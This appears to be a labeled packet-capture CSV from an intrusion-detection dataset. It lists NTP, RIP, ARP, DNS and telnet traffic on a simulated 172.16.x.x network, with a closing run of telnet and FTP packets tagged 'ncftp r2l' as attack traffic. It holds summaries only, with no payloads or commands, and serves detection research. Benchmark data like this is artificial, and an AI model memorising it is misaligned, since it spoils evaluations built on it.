"R"," R", "3017328","21:43:55.947217","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017329","21:43:56.273387","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017330","21:43:56.273616","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017331","21:43:57.109679","","","LOOP","60","Reply"
"R"," R", "3017332","21:43:57.293751","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017333","21:43:57.294808","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017334","21:43:57.312513","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5383 Ack=36415 Win=32120 Len=0"
"R"," R", "3017335","21:43:59.462384","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017336","21:43:59.463456","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017337","21:43:59.482044","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5384 Ack=36416 Win=32120 Len=0"
"R"," R", "3017338","21:44:02.724078","172.16.114.207","196.37.75.158","TELNET","60","Telnet Data ..."
"R"," R", "3017339","21:44:02.725141","196.37.75.158","172.16.114.207","TELNET","60","Telnet Data ..."
"R"," R", "3017340","21:44:02.741371","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5386 Ack=36418 Win=32120 Len=0"
"R"," R", "3017341","21:44:02.742257","196.37.75.158","172.16.114.207","TELNET","115","Telnet Data ..."
"R"," R", "3017342","21:44:02.761362","172.16.114.207","196.37.75.158","TCP","60","16442 → 23 [ACK] Seq=5386 Ack=36479 Win=32120 Len=0"
"R"," R", "3017343","21:44:03.032448","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017344","21:44:07.107526","","","LOOP","60","Reply"
"R"," R", "3017345","21:44:11.720256","172.16.112.20","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017346","21:44:11.720744","172.16.112.10","172.16.112.20","NTP","90","NTP Version 3, server"
"R"," R", "3017347","21:44:17.105320","","","LOOP","60","Reply"
"R"," R", "3017348","21:44:17.218575","172.16.113.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017349","21:44:17.218985","172.16.112.10","172.16.113.50","NTP","90","NTP Version 3, server"
"R"," R", "3017350","21:44:26.267157","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017351","21:44:26.267350","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017352","21:44:27.103128","","","LOOP","60","Reply"
"R"," R", "3017353","21:44:29.126687","","","CDP","324","Device ID: loud.eyrie.af.mil.eyrie.af.mil  Port ID: Ethernet1  "
"R"," R", "3017354","21:44:32.603719","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"R"," R", "3017355","21:44:35.940342","","","ARP","60","Who has 172.16.0.1? Tell 172.16.112.5"
"R"," R", "3017356","21:44:35.941827","","","ARP","60","172.16.0.1 is at 00:10:7b:38:46:33"
"R"," R", "3017357","21:44:35.941898","172.16.112.5","172.16.0.1","ICMP","64","Echo (ping) request  id=0x0008, seq=41807/20387, ttl=32"
"R"," R", "3017358","21:44:35.944086","172.16.0.1","172.16.112.5","ICMP","64","Echo (ping) reply    id=0x0008, seq=41807/20387, ttl=255 (request in 3017357)"
"R"," R", "3017359","21:44:36.330949","172.16.114.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017360","21:44:36.331449","172.16.112.10","172.16.114.50","NTP","90","NTP Version 3, server"
"R"," R", "3017361","21:44:37.124725","","","LOOP","60","Reply"
"R"," R", "3017362","21:44:45.133851","","","ARP","60","Who has 172.16.114.50? Tell 172.16.112.20"
"R"," R", "3017363","21:44:45.134008","","","ARP","60","172.16.114.50 is at 00:00:c0:17:79:5a"
"R"," R", "3017364","21:44:45.134144","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
"R"," R", "3017365","21:44:45.134509","","","ARP","60","Who has 172.16.118.20? Tell 172.16.114.50"
"R"," R", "3017366","21:44:45.134641","","","ARP","60","172.16.118.20 is at 00:c0:4f:a3:57:db"
"R"," R", "3017367","21:44:45.134834","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [SYN, ACK] Seq=0 Ack=1 Win=31744 Len=0 MSS=1460"
"R"," R", "3017368","21:44:45.135263","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=1 Ack=1 Win=32120 Len=0"
"R"," R", "3017369","21:44:45.136605","172.16.118.20","172.16.114.50","TELNET","78","Telnet Data ..."
"R"," R", "3017370","21:44:45.148971","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=1 Ack=25 Win=31744 Len=0"
"R"," R", "3017371","21:44:45.151620","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x4372 PTR 20.118.16.172.in-addr.arpa"
"R"," R", "3017372","21:44:45.152966","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x4372 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"R"," R", "3017373","21:44:45.153757","172.16.114.50","172.16.118.20","TELNET","66","Telnet Data ..."
"R"," R", "3017374","21:44:45.154297","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017375","21:44:45.154541","172.16.114.50","172.16.118.20","TELNET","69","Telnet Data ..."
"R"," R", "3017376","21:44:45.168912","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=28 Ack=28 Win=31744 Len=0"
"R"," R", "3017377","21:44:45.169326","172.16.118.20","172.16.114.50","TELNET","63","Telnet Data ..."
"R"," R", "3017378","21:44:45.169553","172.16.114.50","172.16.118.20","TELNET","72","Telnet Data ..."
"R"," R", "3017379","21:44:45.180843","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=37 Ack=46 Win=32120 Len=0"
"R"," R", "3017380","21:44:45.188911","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=46 Ack=37 Win=31744 Len=0"
"R"," R", "3017381","21:44:45.189373","172.16.118.20","172.16.114.50","TELNET","87","Telnet Data ..."
"R"," R", "3017382","21:44:45.190888","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017383","21:44:45.191362","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017384","21:44:45.199575","172.16.114.50","172.16.112.20","DNS","79","Standard query 0x07dd A linux2.eyrie.af.mil"
"R"," R", "3017385","21:44:45.200159","172.16.114.50","172.16.118.20","TELNET","123","Telnet Data ..."
"R"," R", "3017386","21:44:45.200294","172.16.112.20","172.16.114.50","DNS","144","Standard query response 0x07dd A linux2.eyrie.af.mil A 172.16.118.20 NS hobbes.eyrie.af.mil A 172.16.112.20"
"R"," R", "3017387","21:44:45.200757","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017388","21:44:45.212175","172.16.114.50","172.16.118.20","TELNET","61","Telnet Data ..."
"R"," R", "3017389","21:44:45.230833","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=76 Ack=125 Win=32120 Len=0"
"R"," R", "3017390","21:44:45.321614","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017391","21:44:45.321932","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017392","21:44:45.340800","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=77 Ack=126 Win=32120 Len=0"
"R"," R", "3017393","21:44:45.350918","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017394","21:44:45.351220","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017395","21:44:45.370791","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=78 Ack=127 Win=32120 Len=0"
"R"," R", "3017396","21:44:45.400908","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017397","21:44:45.401208","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017398","21:44:45.420784","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=79 Ack=128 Win=32120 Len=0"
"R"," R", "3017399","21:44:45.430894","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017400","21:44:45.431193","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017401","21:44:45.450767","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=80 Ack=129 Win=32120 Len=0"
"R"," R", "3017402","21:44:45.460885","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017403","21:44:45.461185","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017404","21:44:45.480761","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=81 Ack=130 Win=32120 Len=0"
"R"," R", "3017405","21:44:45.511576","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017406","21:44:45.511886","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017407","21:44:45.530746","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=83 Ack=132 Win=32120 Len=0"
"R"," R", "3017408","21:44:45.530975","172.16.114.50","172.16.118.20","TELNET","64","Telnet Data ..."
"R"," R", "3017409","21:44:45.550744","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=83 Ack=142 Win=32120 Len=0"
"R"," R", "3017410","21:44:45.641339","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017411","21:44:45.658817","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=84 Win=31744 Len=0"
"R"," R", "3017412","21:44:45.670829","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017413","21:44:45.688809","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=85 Win=31744 Len=0"
"R"," R", "3017414","21:44:45.700857","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017415","21:44:45.718799","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=86 Win=31744 Len=0"
"R"," R", "3017416","21:44:45.730813","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017417","21:44:45.748796","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=87 Win=31744 Len=0"
"R"," R", "3017418","21:44:45.760800","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017419","21:44:45.778790","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=142 Ack=88 Win=31744 Len=0"
"R"," R", "3017420","21:44:45.801428","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017421","21:44:45.801777","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017422","21:44:45.820669","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=144 Win=32120 Len=0"
"R"," R", "3017423","21:44:45.829048","172.16.114.50","172.16.118.20","TELNET","70","Telnet Data ..."
"R"," R", "3017424","21:44:45.840662","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=160 Win=32120 Len=0"
"R"," R", "3017425","21:44:45.932280","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017426","21:44:45.950651","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=90 Ack=166 Win=32120 Len=0"
"R"," R", "3017427","21:44:46.041234","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017428","21:44:46.041612","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017429","21:44:46.060585","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=91 Ack=167 Win=32120 Len=0"
"R"," R", "3017430","21:44:46.070703","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017431","21:44:46.071031","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017432","21:44:46.090575","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=92 Ack=168 Win=32120 Len=0"
"R"," R", "3017433","21:44:46.100690","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017434","21:44:46.101022","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017435","21:44:46.120564","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=93 Ack=169 Win=32120 Len=0"
"R"," R", "3017436","21:44:46.130690","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017437","21:44:46.131029","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017438","21:44:46.150564","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=94 Ack=170 Win=32120 Len=0"
"R"," R", "3017439","21:44:46.150741","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017440","21:44:46.151161","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017441","21:44:46.170549","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=95 Ack=171 Win=32120 Len=0"
"R"," R", "3017442","21:44:46.180664","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017443","21:44:46.181121","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017444","21:44:46.200540","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=96 Ack=172 Win=32120 Len=0"
"R"," R", "3017445","21:44:46.200724","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017446","21:44:46.201057","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017447","21:44:46.220534","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=97 Ack=173 Win=32120 Len=0"
"R"," R", "3017448","21:44:46.220717","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017449","21:44:46.221050","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017450","21:44:46.240530","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=98 Ack=174 Win=32120 Len=0"
"R"," R", "3017451","21:44:46.241358","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"R"," R", "3017452","21:44:46.241720","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"R"," R", "3017453","21:44:46.260525","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=178 Win=32120 Len=0"
"R"," R", "3017454","21:44:46.543231","172.16.114.50","172.16.118.20","TELNET","115","Telnet Data ..."
"R"," R", "3017455","21:44:46.560444","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=239 Win=32120 Len=0"
"R"," R", "3017456","21:44:46.560908","172.16.114.50","172.16.118.20","TELNET","256","Telnet Data ..."
"R"," R", "3017457","21:44:46.580436","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=441 Win=32120 Len=0"
"R"," R", "3017458","21:44:46.667584","172.16.114.50","172.16.118.20","TELNET","61","Telnet Data ..."
"R"," R", "3017459","21:44:46.680410","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=100 Ack=448 Win=32120 Len=0"
"R"," R", "3017460","21:44:47.122489","","","LOOP","60","Reply"
"R"," R", "3017461","21:44:51.271222","","","ARP","60","Who has 172.16.112.100? Tell 172.16.112.20"
"R"," R", "3017462","21:44:56.260828","172.16.112.20","172.16.255.255","RIPv1","66","Response"
"R"," R", "3017463","21:44:56.261030","172.16.112.20","172.16.118.255","RIPv1","66","Response"
"R"," R", "3017464","21:44:57.120321","","","LOOP","60","Reply"
"R"," R", "3017465","21:44:59.930333","172.16.112.50","172.16.112.10","NTP","90","NTP Version 3, client"
"R"," R", "3017466","21:44:59.930801","172.16.112.10","172.16.112.50","NTP","90","NTP Version 3, server"
"R"," R", "3017467","21:45:01.290163","172.16.0.1","224.0.0.9","RIPv2","86","Response"
"ncftp"," r2l", "3017468","21:45:06.666066","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017469","21:45:06.666556","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017470","21:45:06.684816","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=101 Ack=449 Win=32120 Len=0"
"ncftp"," r2l", "3017471","21:45:06.685008","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017472","21:45:06.685359","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017473","21:45:06.704807","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=102 Ack=450 Win=32120 Len=0"
"ncftp"," r2l", "3017474","21:45:06.704991","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017475","21:45:06.705342","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017476","21:45:06.724808","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=103 Ack=451 Win=32120 Len=0"
"ncftp"," r2l", "3017477","21:45:06.724983","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017478","21:45:06.725336","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017479","21:45:06.744806","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=104 Ack=452 Win=32120 Len=0"
"ncftp"," r2l", "3017480","21:45:06.744978","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017481","21:45:06.745331","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017482","21:45:06.764790","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=105 Ack=453 Win=32120 Len=0"
"ncftp"," r2l", "3017483","21:45:06.765071","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017484","21:45:06.765423","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017485","21:45:06.784785","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=106 Ack=454 Win=32120 Len=0"
"ncftp"," r2l", "3017486","21:45:06.784973","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017487","21:45:06.785325","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017488","21:45:06.804778","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=107 Ack=455 Win=32120 Len=0"
"ncftp"," r2l", "3017489","21:45:06.804962","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017490","21:45:06.805313","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017491","21:45:06.824776","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=108 Ack=456 Win=32120 Len=0"
"ncftp"," r2l", "3017492","21:45:06.824957","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017493","21:45:06.825310","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017494","21:45:06.844767","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=109 Ack=457 Win=32120 Len=0"
"ncftp"," r2l", "3017495","21:45:06.844950","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017496","21:45:06.845302","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017497","21:45:06.864764","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=110 Ack=458 Win=32120 Len=0"
"ncftp"," r2l", "3017498","21:45:06.864946","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017499","21:45:06.865299","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017500","21:45:06.884755","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=111 Ack=459 Win=32120 Len=0"
"ncftp"," r2l", "3017501","21:45:06.884940","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017502","21:45:06.885292","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017503","21:45:06.904750","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=112 Ack=460 Win=32120 Len=0"
"ncftp"," r2l", "3017504","21:45:06.904934","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017505","21:45:06.905286","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017506","21:45:06.924745","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=113 Ack=461 Win=32120 Len=0"
"ncftp"," r2l", "3017507","21:45:06.924929","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017508","21:45:06.925282","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017509","21:45:06.944740","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=114 Ack=462 Win=32120 Len=0"
"ncftp"," r2l", "3017510","21:45:06.944922","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017511","21:45:06.945274","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017512","21:45:06.964734","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=115 Ack=463 Win=32120 Len=0"
"ncftp"," r2l", "3017513","21:45:06.964917","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017514","21:45:06.965270","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017515","21:45:06.984728","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=116 Ack=464 Win=32120 Len=0"
"ncftp"," r2l", "3017516","21:45:06.984912","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017517","21:45:06.985264","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017518","21:45:07.004724","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=117 Ack=465 Win=32120 Len=0"
"ncftp"," r2l", "3017519","21:45:07.004907","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017520","21:45:07.005259","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017521","21:45:07.024804","172.16.118.20","172.16.114.50","TCP","60","1304 → 23 [ACK] Seq=118 Ack=466 Win=32120 Len=0"
"ncftp"," r2l", "3017522","21:45:07.025753","172.16.118.20","172.16.114.50","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017523","21:45:07.044397","172.16.114.50","172.16.118.20","TCP","60","23 → 1304 [ACK] Seq=466 Ack=120 Win=31744 Len=0"
"ncftp"," r2l", "3017524","21:45:07.075316","172.16.114.50","172.16.118.20","TELNET","60","Telnet Data ..."
"ncftp"," r2l", "3017525","21:45:07.076855","172.16.114.50","172.16.112.20","DNS","86","Standard query 0x7680 PTR 20.118.16.172.in-addr.arpa"
"ncftp"," r2l", "3017526","21:45:07.078023","172.16.112.20","172.16.114.50","DNS","175","Standard query response 0x7680 PTR 20.118.16.172.in-addr.arpa PTR linux2.eyrie.af.mil NS hobbes.eyrie.af.mil A 172.16.112.20"
"ncftp"," r2l", "3017527","21:45:07.078645","172.16.114.50","172.16.118.20","TCP","60","6207 → 21 [SYN] Seq=0 Win=512 Len=0 MSS=1460"
